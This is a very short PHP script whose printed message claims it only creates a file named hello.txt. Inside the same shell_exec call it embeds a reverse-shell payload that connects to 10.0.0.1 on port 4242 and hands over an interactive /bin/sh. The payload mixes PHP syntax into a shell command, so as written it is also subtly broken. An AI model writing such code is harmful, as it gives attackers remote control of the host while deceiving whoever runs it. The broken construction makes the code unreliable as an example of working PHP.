<?php
shell_exec('touch hello.txt && $sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");');
echo "hello.txt created";
?>
